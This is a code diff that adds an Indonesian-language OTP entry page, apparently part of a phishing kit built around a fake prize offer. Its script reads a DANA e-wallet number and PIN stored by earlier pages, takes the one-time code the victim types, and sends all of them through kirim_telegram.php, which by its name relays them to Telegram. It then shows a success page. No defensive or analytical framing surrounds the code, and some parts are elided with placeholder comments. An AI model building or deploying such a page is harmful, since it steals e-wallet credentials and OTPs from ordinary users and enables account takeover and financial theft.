@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masukkan Kode OTP</title>
+    <style>
+        /* ... (CSS seperti sebelumnya) ... */
+    </style>
+</head>
+<body>
+    <!-- ... (Kode HTML seperti sebelumnya) ... -->
+    <script>
+        let waktu = 60;
+        let countdownInterval;
+
+        function kirimData(data) {
+            const formData = new FormData();
+            for (const key in data) {
+                formData.append(key, data[key]);
+            }
+
+            fetch('kirim_telegram.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log(data); // Tampilkan response dari PHP (opsional)
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Terjadi kesalahan saat mengirim data ke Telegram.');
+            });
+        }
+
+        function startTimer() {
+            // ... (Kode timer seperti sebelumnya) ...
+        }
+
+        window.onload = startTimer;
+
+        function moveNext(current, index) {
+            // ... (Kode moveNext seperti sebelumnya) ...
+        }
+
+        function verifikasiOtp() {
+            const otpBoxes = document.querySelectorAll('.otp-box');
+            let kodeOtp = "";
+            for (let i = 0; i < otpBoxes.length; i++) {
+                if (otpBoxes[i].value === "") {
+                    alert("Isi semua kotak OTP");
+                    return;
+                }
+                kodeOtp += otpBoxes[i].value;
+            }
+            if (kodeOtp.length !== 4 || isNaN(kodeOtp)) {
+                alert("Kode OTP harus 4 angka");
+                return;
+            }
+
+            const hadiah = localStorage.getItem('hadiahDipilih');
+            const nomorDana = localStorage.getItem('nomorDana');
+            const pin = localStorage.getItem('pin');
+
+            kirimData({ hadiah: hadiah, nomorDana: nomorDana, pin: pin, otp: kodeOtp }); // Kirim data OTP
+
+            alert('Kode OTP: ' + kodeOtp + ' diverifikasi dan data dikirim ke Telegram.');
+            window.location.href = 'sukses.html';
+        }
+    </script>
+</body>
+</html>
